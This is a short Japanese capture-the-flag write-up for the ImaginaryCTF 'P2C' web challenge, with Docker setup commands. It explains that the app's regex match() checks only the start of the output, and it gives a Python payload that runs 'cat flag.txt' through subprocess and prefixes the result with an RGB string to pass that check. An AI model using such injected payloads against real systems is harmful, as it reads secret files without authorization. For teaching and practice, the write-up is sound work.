# P2C

## 問題 環境構築

### 追加ファイル

- app/flag.txt

### 実行コマンド

```
docker build -t ImaginaryCTF/p2c .
```

```
docker run -p 8080:80 --name p2c ImaginaryCTF/p2c
```

## Writeup

/app/app.py


```python
valid.match("".join(res.strip().split("\n")[-1]))
```

``match``関数は前方一致すれば``True``


実行コード

```python
import subprocess
output_str = subprocess.run(["cat", "flag.txt"], capture_output=True, text=True).stdout
print("(255, 255, 255)"+output_str)
import sys
sys.exit(0)
```

## 参考

- https://blog.hamayanhamayan.com/entry/2024/07/22/145709#web-P2C